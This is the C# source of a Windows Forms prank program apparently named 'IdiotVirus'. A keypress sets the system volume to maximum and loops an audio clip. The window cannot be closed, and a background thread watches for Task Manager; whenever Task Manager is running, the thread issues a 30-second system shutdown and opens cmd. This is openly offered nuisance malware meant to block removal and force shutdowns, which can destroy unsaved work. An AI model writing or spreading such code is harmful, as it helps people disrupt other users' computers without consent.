using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Timers;
using System.Windows;
using System.Windows.Media;
using System.Media;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Threading;

namespace IdiotVirus
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            this.KeyDown += button_KeyDown;
            button1.KeyDown += button_KeyDown;

            /*MyRectangle = new Rectangle(0, 0, 60, 60);
            update = new Timer();
            update.Interval = 10;
            update.Tick += Update_OnTick;
            MainPictureBox.Paint += squere_Paint;*/
        }

        /*private void Update_OnTick(object sender, EventArgs eventArgs)
        {
            MyRectangle.Location = new Point(MyRectangle.Location.X + dx, MyRectangle.Location.Y + dy); // Меняем положения

            // Условия отскока
            if (MyRectangle.Location.X > 330 || MyRectangle.Location.X < 30)
            {
                dx = -dx;
            }

            if (MyRectangle.Location.Y > 350 || MyRectangle.Location.Y < 5)
            {
                dy = -dy;
            }

            MainPictureBox.Invalidate(); // Делаем перересовку
        }*/

        [DllImport("winmm.dll")]
        public static extern int waveOutSetVolume(IntPtr hwo, uint dwVolume);

        bool button1DoubleClicked = false;
        private void button1_DoubleClick()
        {
            button1.Click -= button1_Click;
            this.Text += "LOL";
            if (!button1DoubleClicked)
            {
                waveOutSetVolume(IntPtr.Zero, 4294000000);
                button1DoubleClicked = true;
                this.Size = new System.Drawing.Size(506, 323);
                button1.Image = global::IdiotVirus.Properties.Resources.among_us;
                SoundPlayer player = new SoundPlayer();
                player.Stream = Properties.Resources.amogus;
                player.PlayLooping();

                this.FormClosing += Form1_FormClosing;
                Thread thread = new Thread(check_TaskMgr);
                thread.Start();
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            SoundPlayer player = new SoundPlayer();
            player.Stream = Properties.Resources.tora;
            player.Play();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
            this.Text += "LOL";
        }

        private void button_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.N)
            {
                /*this.FormClosing -= Form1_FormClosing;
                this.Close();*/
                button1_DoubleClick();
            }
        }

        private void check_TaskMgr()
        {
            while (true)
            {
                if (Process.GetProcessesByName("TaskMgr").Count() != 0)
                {
                    Process.Start("shutdown", "/s /t 30");
                    Process.Start("cmd");
                }
                Thread.Sleep(1000);
            }
        }
    }
}